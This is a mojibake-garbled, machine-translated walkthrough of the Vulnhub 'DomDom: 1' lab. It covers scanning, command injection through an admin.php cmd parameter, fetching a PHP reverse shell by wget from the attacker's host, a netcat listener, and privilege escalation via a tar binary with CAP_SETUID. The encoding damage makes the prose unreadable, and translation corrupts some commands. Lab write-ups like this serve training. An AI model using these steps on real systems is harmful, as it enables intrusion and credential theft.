# DomDom: 1 æ¼«æ¸¸| Vulnhub

> åŸæ–‡ï¼š<https://infosecwriteups.com/domdom-1-walkthrough-vulnhub-eee2378702f4?source=collection_archive---------2----------------------->

![](img/fad0732c3c1f6d31cc72d23af8047c0e.png)

æœ‹å‹ä»¬ï¼Œä½ ä»¬å¥½ï¼Œæˆ‘æ˜¯è¿ªå°¼æœÂ·è´¾äºšè¾›æ ¼ï¼Œè¿™æ˜¯æˆ‘çš„ç¬¬å››ç¯‡æ–‡ç« ã€‚æœ¬æ–‡æ˜¯å¯¹ **DomDom: 1 Vunhub box** çš„æ¼”ç»ƒã€‚è¿™ä¸ªç›’å­ä¹Ÿæ˜¯ä¸€ä¸ªå¼•å¯¼åˆ°æ ¹çš„åˆçº§æŒ‘æˆ˜ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°è¿™ä¸ªæ¥è‡ª[çš„ Vulnhub ç›’å­ã€‚](https://www.vulnhub.com/entry/domdom-1,328/)

# æ–¹æ³•å­¦

*   ç½‘ç»œæ‰«æ
    ğŸ‘‰è¯†åˆ«æ­£åœ¨è¿è¡Œçš„æœåŠ¡&å¼€æ”¾ç«¯å£( **Nmap** )
*   æšä¸¾/ä¾¦å¯Ÿ
    ğŸ‘‰ç½‘é¡µç›®å½•( **DIRB** )
    ğŸ‘‰æ˜“å— RCE ( **æ‰“å—ç»„æ›²**)æ”»å‡»
*   æ¼æ´åˆ©ç”¨
    ğŸ‘‰ä¸Šä¼ åé—¨( **PHP åå‘å¤–å£³** )
    ğŸ‘‰Spawn shell ( **Netcat ä¼šè¯**)
*   æƒé™æå‡
    ğŸ‘‰æ»¥ç”¨èƒ½åŠ›æƒé™

# æ¸¸æˆæ”»ç•¥

## ç½‘ç»œæ‰«æ

ğŸ“Œï¸åœ¨æ‰«æçš„ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä½¿ç”¨äº† arp-scan -l å‘½ä»¤æ¥æ‰§è¡Œæœ¬åœ°ç½‘ç»œæ‰«æï¼Œä»¥æ‰¾å‡ºç›®æ ‡æœºå™¨çš„ IP åœ°å€ã€‚

> å‘½ä»¤: **arp-scan -l**

![](img/ac99ad8ed93d427f84f3b9ac2113760a.png)

ğŸ“Œï¸åœ¨å¾—åˆ°ç›®æ ‡æœºå™¨çš„ IP åœ°å€åï¼Œæˆ‘å¯¹æˆ‘çš„ç›®æ ‡è¿›è¡Œäº†ä¸€æ¬¡ Nmap æ‰«æã€‚æˆ‘ç”¨è¿‡ï¼Œ
ğŸ‘‰ **-sV** :è‡³åº”ç”¨ç‰ˆæœ¬æ‰«æ
ğŸ‘‰ **-A** :è‡³æ“ä½œç³»ç»Ÿæ£€æµ‹ã€è„šæœ¬æ‰«æã€è·Ÿè¸ªè·¯ç”±(ä¸»åŠ¨æ‰«æ)

> å‘½ä»¤:**nmap-sV-A-T4-p-192 . 168 . 56 . 110**

![](img/d67ca3ed81863d6a31dca8a2b3ab7e44.png)

ğŸ“Œï¸ä»è¿™ä¸ª Nmap æ‰«æä¸­ï¼Œæˆ‘å‘ç°é‚£é‡Œçš„ **tcp 80 ç«¯å£**æ˜¯æ‰“å¼€çš„ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨æµè§ˆå™¨ä¸Šæµè§ˆè¿™ä¸ª IPã€‚åœ¨è¿™ä¸ªé¡µé¢ä¸­å‘æˆ‘ä»¬å±•ç¤ºäº†ä¸€äº›ç™»å½•ç•Œé¢ã€‚

![](img/aef10bc6acbe40f488fe38d4cfa0b353.png)

## æŸ¥ç‚¹/ä¾¦å¯Ÿ

ğŸ“Œï¸:åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä½¿ç”¨ dirbuster å·¥å…·æ¥åˆ—ä¸¾è¿™ä¸ªç›®æ ‡çš„æœ‰è¶£çš„å­åŸŸã€‚

> å‘½ä»¤:**dirb http://192 . 168 . 56 . 110**

![](img/6df9608dde55df03d448c922c5318998.png)

ğŸ“Œï¸:æˆ‘å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œé‚£å°±æ˜¯

**![](img/14403f3f5157ac208557728988b7604a.png)**

**ğŸ“Œï¸:æ‰€ä»¥ç°åœ¨æˆ‘æ¢ç´¢ http://192 . 168 . 56 . 110 å¹¶åœ¨æˆ‘çš„ BurpSuit ä¸­æ‰“å¼€æ‹¦æˆªæ¥æ•è· http è¯·æ±‚ã€‚**

**![](img/a3386ff379607fa5095621e5917fb390.png)**

**ğŸ“Œç„¶åï¼Œï¸å°†æˆªè·çš„æ•°æ®å‘é€åˆ°ä¸­ç»§å™¨ï¼Œä»¥è¯†åˆ«æ­£åœ¨æ‰§è¡Œçš„æ“ä½œã€‚ç°åœ¨å°† POST è¯·æ±‚ä» **/index.php** æ›´æ”¹ä¸º **/admin.php** ä»¥æ ‡è¯†è¯¥åŠ¨ä½œã€‚**

> **æ”¹:POST/**admin.php**HTTP/1.1**

**![](img/f0780a10ac5a86215a6a74f1ad497346.png)**

**ğŸ“Œï¸é…·ï¼ï¼æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå†…ç½®çš„è„šæœ¬ï¼Œå®ƒä»å‘½ä»¤çš„å“åº”ä¸­æ‰§è¡Œå‘½ä»¤ã€‚**

**ğŸ“Œï¸ä¸ºäº†ç¡®ä¿æˆ‘ä»¬æœ‰åç«¯åŠŸèƒ½ï¼Œæˆ‘ä»¬å°è¯•å‘å‡ºæ‰§è¡Œâ€œidâ€å‘½ä»¤çš„è¯·æ±‚ï¼Œå¹¶è·å¾—é¢„æœŸçš„ç»“æœã€‚**

> **name = admin & username = admin & password = admin & access = access &**cmd = id****

**![](img/367dd41fa44f089313695cd964fc9857.png)**

**ğŸ“Œï¸:æ‰€ä»¥æˆ‘æ‰¾åˆ°äº†æ¶æ„ä»£ç å¯ä»¥è¢«æ‰§è¡Œçš„æ–¹å¼ï¼Œæˆ–è€…å°†æ¶æ„æ–‡ä»¶æ³¨å…¥åˆ°åå‘è¿æ¥æœºå™¨çš„ä¸»æœºä¸­ã€‚**

**ğŸ“Œä¸ºæ­¤ï¼Œæˆ‘ä» Pentestmonkey è·å¾—äº† **php-reverse-shell** ã€‚æˆ‘æ”¹å˜äº†å¤–å£³ä»£ç çš„ IP åœ°å€å’Œç«¯å£ã€‚**

**![](img/c8a9b9b62a1df28fc7acc61a7c16175c.png)**

## **å‰¥å‰Š**

**ğŸ“Œï¸So:ç°åœ¨æˆ‘ç«‹å³åˆ›å»ºäº†ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œé€šè¿‡æµè§ˆå™¨ç«‹å³ä¸ºé‚£ä¸ª **php-reverse-shell** æ–‡ä»¶æä¾›æœåŠ¡ï¼Œè€Œä¸ç”¨å®‰è£…ä»»ä½• web æœåŠ¡å™¨ã€‚**

> **å‘½ä»¤: **python -m SimpleHTTPServer****

**![](img/8edcfa2cee6c42b73dd3dd6b1cbef8f6.png)**

**ğŸ“Œï¸Now ä½¿ç”¨ BurpSuite ä»æˆ‘çš„ Kali box ä¸‹è½½è¿™ä¸ª **php-reverse-shell** åˆ°ç›®æ ‡æœºå™¨ã€‚**

> ****cmd = wget http://192 . 168 . 56 . 105/PHP-reverse-shell . PHP****

**![](img/10eaff80377f7db25753f30f4c532bf2.png)****![](img/de26ca87f8fc28065d7661c58da2e512.png)**

**ğŸ“Œï¸åœ¨ä¸‹è½½äº†é‚£ä¸ª **php-reverse-shell** æ–‡ä»¶åæˆ‘æ›´æ”¹äº†é‚£ä¸ªæ–‡ä»¶çš„æƒé™ã€‚(æˆ‘å°†è¿™ä¸‰ä¸ªæƒé™éƒ½ç»™äº†æ‰€æœ‰ç”¨æˆ·)**

> ****cmd = chmod 777 php-reverse-shell.php****

**![](img/88ed26def17417769950949e5aed1f08.png)**

**ğŸ“Œï¸æ›´æ”¹åï¼Œæˆ‘æ‰“å¼€æˆ‘çš„ kali ç»ˆç«¯ï¼Œä½¿ç”¨ **Netcat å·¥å…·**ç›‘å¬ç«¯å£ **4545****

**![](img/a72e06886ae5b93fed749686c3af0dd0.png)**

**ğŸ“Œï¸ä¹‹åï¼Œæˆ‘ä½¿ç”¨ BurpSuit è¿è¡Œä¸Šé¢çš„ **php-reverse-shell** æ–‡ä»¶ã€‚**

> ****cmd = PHP PHP-reverse-shell****

**ğŸ“Œï¸å“‡ï¼ï¼ç°åœ¨æˆ‘å¾—åˆ°äº†è¿™ä¸ªç›®æ ‡æœºå™¨çš„è¿œç¨‹å¤–å£³ã€‚**

**![](img/b1b38f6207adbb90000a4aa3765d5163.png)**

## **æƒé™æå‡**

**ğŸ“Œï¸ç°åœ¨æˆ‘æ‰“å¼€äº†**å·¨èŸ’äº§åµçš„å¤–å£³ã€‚****

> **å‘½ä»¤: **python3 -c 'å¯¼å…¥ ptypty.spawn("/bin/bash")'****

**![](img/3a19585e0bbb11880b986795f370c59c.png)**

**ğŸ“Œï¸åœ¨è¿›ä¸€æ­¥çš„æ¢ç´¢ä¸­ï¼Œ **README.md** è¢«ä» root-owned é‡Œé¢æ‰¾åˆ°äº† **/domom/home/desktopã€‚****

**![](img/6e8e7063f656225369db23cd2db3ff86.png)****![](img/ac67bee71e348b6681903ed878c3b3e3.png)**

**ğŸ“Œï¸:åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘æƒ³æˆ‘å¯ä»¥ä½¿ç”¨ **getcap** æ¥è¯†åˆ«äºŒè¿›åˆ¶åŠŸèƒ½æ–‡ä»¶å¹¶çœ‹åˆ°æˆåŠŸçš„ç»“æœã€‚**

> **å‘½ä»¤:**getcap-r/2>/dev/null****

**![](img/c804ceae580e50510c89416e994498a1.png)**

**ğŸ“Œï¸æ­£å¦‚æˆ‘ä»¬åœ¨æœ¬çº¿ç¨‹å‰é¢çš„å›¾ç‰‡ä¸­çœ‹åˆ°çš„ï¼Œ **"/bin/tar"** å…·æœ‰å‹ç¼©æ–‡ä»¶çš„åŠŸèƒ½ã€‚è¿™å¯ä»¥ä¿®æ”¹å®ƒçš„è¿›ç¨‹ UIDï¼Œå¹¶ä½œä¸ºåé—¨ä¸ Linux ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¿ç•™å…·æœ‰èƒ½åŠ›é›† **CAP_SETUID** çš„é«˜ç‰¹æƒï¼Œæ‰€ä»¥æˆ‘æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥ç”Ÿæˆã€‚ **tar README.md** åœ¨ **/tmp** ç›®å½•ä¸‹ã€‚**

> **å‘½ä»¤: **/tmp**
> å‘½ä»¤:**tar-CVF readme.tar/home/domom/Desktop/readme . MD****

**![](img/f0babb5be85aed018b3a845720d0d273.png)**

**ğŸ“Œå½“ä½ æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤æ—¶ï¼Œï¸ It ä¼šåœ¨ **/tmp** ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª**readme.tar**æ–‡ä»¶ï¼Œå¯ä»¥æå–å‡ºæ¥è¿›ä¸€æ­¥è¯»å– **README.md** æ–‡ä»¶ã€‚**

> **å‘½ä»¤:**tar-xvf readme.tar**
> å‘½ä»¤:**cat/home/domom/Desktop/readme . MD****

**![](img/3255cc2fed61b4614f68c099c6c906c2.png)**

**ğŸ“Œï¸é…·ï¼ï¼æˆ‘ä»è¿™ä¸ªæ–‡ä»¶ä¸­è·å¾—äº†â€œ **root** çš„å¯†ç ã€‚ç°åœ¨æˆ‘ä½¿ç”¨è¿™ä¸ªå¯†ç åˆ‡æ¢åˆ° root å¸æˆ·ã€‚**

> **å‘½ä»¤:**è‹æ ¹****

**![](img/301228192cf0f16890789a737847010e.png)**

**å¤ªæ£’äº†ï¼Œç°åœ¨æˆ‘åœ¨**æ ¹**ä¸Šäº†ã€‚æ‰€ä»¥æˆ‘æƒ³ä½ å¤§æ¦‚çŸ¥é“æˆ‘åœ¨è¿™ä¸ªç›’å­é‡Œç”¨çš„æ˜¯ä»€ä¹ˆæœºåˆ¶ï¼Œä»¥åŠæˆ‘ä»¬èƒ½ä»ä¸­åšäº›ä»€ä¹ˆã€‚**

**æœ‰æˆ‘å†™çš„åšå®¢ã€‚å¦‚æœä½ å¯¹è¿™äº›è¯é¢˜æ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥é€šè¿‡è¶…é“¾æ¥é˜…è¯»ã€‚**

****âœ…** [**ä¸åŒç±»å‹çš„æ¶æ„è½¯ä»¶å’Œå…¶ä»–æ”»å‡»**](/analyzing-malware-and-other-attacks-57567fd7f77b?source=friends_link&sk=12af6b24868f0441227290c34441ecc8) **âœ…** [**æ¯”è¾ƒä¸åŒç±»å‹çš„ç¤¾ä¼šå·¥ç¨‹æŠ€æœ¯**](/comparing-different-types-of-social-engineering-techniques-477336207f70?source=friends_link&sk=fe448ec0c39467bbcedcf4ac70eb2195) **âœ…**[**cold box:easyã€vulnhubã€‘é¢„æ’**](/colddbox-easy-vulnhub-walkthrough-cac3680e03c2?source=friends_link&sk=a9443dbe0162ab4aa5307e94a6e78d5f) **âœ…**[**åŸºç¡€é¢„æ’:1 é¢„æ’| Vulnhub**](/basic-pentesting-1-walkthrough-vulnhub-4dac91b416ff?source=friends_link&sk=cdf388e2e9c80f9f32e149230f94db77)**

# **è®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚ä¸‹æ¬¡è§ï¼Œå†è§ğŸ™Œç¥ä½ é»‘å®¢ç”Ÿæ¶¯æ„‰å¿«ğŸ˜ˆğŸ˜ˆã€‚**